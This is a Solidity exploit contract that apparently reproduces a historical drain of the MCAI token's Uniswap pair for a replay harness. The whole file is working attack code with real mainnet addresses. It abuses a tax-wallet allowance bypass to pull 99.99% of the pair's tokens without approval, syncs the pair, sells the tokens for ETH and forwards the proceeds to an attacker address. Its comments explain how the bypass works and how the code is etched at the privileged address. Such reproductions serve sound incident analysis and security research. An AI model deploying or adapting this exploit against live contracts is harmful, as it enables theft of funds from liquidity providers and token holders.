// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for 2025-01-MCAI.
//
// The real attack tx has the historical "MCAI tax wallet" contract
// (0xdDF062714911A2e59996Eb94A57b7040Ea44309D) itself call
// MCAI.transferFrom(pair, self, drainAmount) — this only succeeds because
// MCAI's `_decreaseAllowance` special-cases `msg.sender == _taxWallet` and
// returns 0, skipping the allowance check entirely. That privileged call
// must originate FROM the tax-wallet address, not from an attacker-deployed
// helper and not from the attacker EOA directly.
//
// The playground's headless replay harness (scripts/_verify-poc.mjs) can only
// prank `setup.steps` calls as the configured `attacker`, so a `setup` step
// cannot fake `msg.sender == taxWallet`. Instead, this synthetic contract's
// RUNTIME code is etched directly at the tax-wallet's address
// (config: exploitContractName + etchAt) — so calling attack() on it makes
// every internal call execute with `address(this) == taxWallet`, reproducing
// the real privilege check faithfully. attack() folds together what the
// Foundry test split into a pranked transferFrom + a separate helper's
// attack(): drain the pair, sync it, sell the drained MCAI, forward the ETH.
interface IERC20MCAI {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniPairV2 {
    function sync() external;
}

interface IUniswapV2RouterMCAI {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

address constant ATTACKER = 0x0C8ecf2BbF9361fa2DD0Bd29ea473FB790aB7fEE;
address constant MCAI = 0x810B5902CB2ac2Fa63dFE4A6935EA32aED975cc8;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant MCAI_WETH_PAIR = 0x660a6619574e87d12Ba7Fa3F5679D5D7F587A4fE;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

contract MCAITaxWalletDrain {
    function attack() external {
        require(msg.sender == ATTACKER, "only attacker");

        // step 1: drain 99.99% of the pair's MCAI. This call executes with
        // address(this) == the tax wallet, so MCAI's `_decreaseAllowance`
        // returns 0 for us (the allowance-bypass backdoor) and the transfer
        // succeeds despite zero approval.
        uint256 pairMcaiBalance = IERC20MCAI(MCAI).balanceOf(MCAI_WETH_PAIR);
        uint256 drainAmount = pairMcaiBalance - pairMcaiBalance / 10_000;
        IERC20MCAI(MCAI).transferFrom(MCAI_WETH_PAIR, address(this), drainAmount);

        // step 2: sync the pair so reserves record the tiny MCAI balance left behind.
        IUniPairV2(MCAI_WETH_PAIR).sync();

        // step 3: sell the drained MCAI through the router and receive ETH.
        IERC20MCAI(MCAI).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = MCAI;
        path[1] = WETH_TOKEN;
        IUniswapV2RouterMCAI(payable(UNISWAP_V2_ROUTER)).swapExactTokensForETHSupportingFeeOnTransferTokens(
            IERC20MCAI(MCAI).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // step 4: forward the ETH profit to the attacker EOA.
        (bool sent,) = payable(ATTACKER).call{value: address(this).balance}("");
        require(sent, "ETH forwarding failed");
    }

    receive() external payable {}
}
